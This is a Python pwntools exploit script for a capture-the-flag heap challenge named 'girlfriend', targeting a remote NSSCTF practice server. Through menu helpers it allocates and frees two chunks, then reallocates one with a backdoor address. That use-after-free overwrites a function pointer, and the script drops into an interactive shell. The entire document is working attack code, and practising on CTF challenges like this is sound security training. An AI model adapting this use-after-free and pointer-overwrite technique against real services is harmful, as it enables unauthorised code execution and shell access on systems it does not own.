#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 64
binary_name = 'girlfriend'
remote_addr, port = 'node4.anna.nssctf.cn:28189'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
display = lambda x:log.success(x)
slp = lambda x:sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def add(size,name='a'):
    sla('choice :',str(1))
    sla('size is :',str(size).encode())
    sla('name is :',name)

def delete(idx):
    sla('choice :',str(2))
    sla('Index :',str(idx).encode())

def show(idx):
    sla('choice :',str(3))
    sla('Index :',str(idx).encode())

#Main function
if __name__ == '__main__':
    #you can add your code here
    backdoor = 0x400B9C
    add(0x10,'aaaa')
    add(0x20,'bbbb')
    delete(0)
    delete(1)
    dbg()
    add(0x10,p64(backdoor))
    show(0)
    p.interactive()
